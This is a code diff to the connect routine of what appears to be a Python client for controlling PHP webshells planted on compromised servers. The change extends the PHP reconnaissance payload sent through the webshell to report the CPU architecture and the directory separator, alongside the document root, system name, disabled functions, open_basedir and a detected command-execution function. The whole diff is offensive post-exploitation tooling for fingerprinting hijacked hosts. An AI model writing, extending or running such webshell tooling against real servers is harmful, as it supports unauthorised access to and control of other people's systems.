@@ -122,13 +122,13 @@ def run(url: str, method: str = "GET", pwd: str = "pass", *encoders_or_params):
         gset("webshell.php_version", res.r_text.split(version_flag_start + "|")[
              1].split("|" + version_flag_end)[0], namespace="webshell")
         info_req = send(
-            """print($_SERVER['DOCUMENT_ROOT'].'|'.php_uname().'|'.$_SERVER['SERVER_SOFTWARE'].'|'.getcwd().'|'.ini_get('upload_tmp_dir').'|'.ini_get('disable_functions').'|'.ini_get('open_basedir'));"""
+            """$bit=PHP_INT_SIZE==4?32:64;
+print($_SERVER['DOCUMENT_ROOT'].'|'.php_uname().'|'.$_SERVER['SERVER_SOFTWARE'].'|'.getcwd().'|'.sys_get_temp_dir().'|'.ini_get('disable_functions').'|'.ini_get('open_basedir').'|'.$bit.'|'.DIRECTORY_SEPARATOR);"""
         )
         info = info_req.r_text.strip().split("|")
         exec_func = send(get_detectd_exec_php()).r_text.strip()
         prepare_system_template(exec_func)
         gset("webshell.root", info[0], namespace="webshell")
-        gset("webshell.os_version", info[1], namespace="webshell")
         gset(
             "webshell.iswin",
             (True if "win" in info[1].lower() else False),
@@ -153,6 +153,15 @@ def run(url: str, method: str = "GET", pwd: str = "pass", *encoders_or_params):
         if ('' in disable_function_list):
             disable_function_list.remove('')
         gset("webshell.obd", info[6], namespace="webshell")
+        bits = info[7]
+        try:
+            bits = int(bits)
+        except ValueError:
+            bits = 0
+            print(color.yellow("detect architecture error\n"))
+        gset("webshell.os_version", info[1] + " (%d bits)" % bits, namespace="webshell")
+        gset("webshell.arch", bits, namespace="webshell")
+        gset("webshell.directory_separator", info[8], namespace="webshell")
         gset("webshell.disable_functions",
              disable_function_list, namespace="webshell")
         root_path = gget("root_path")
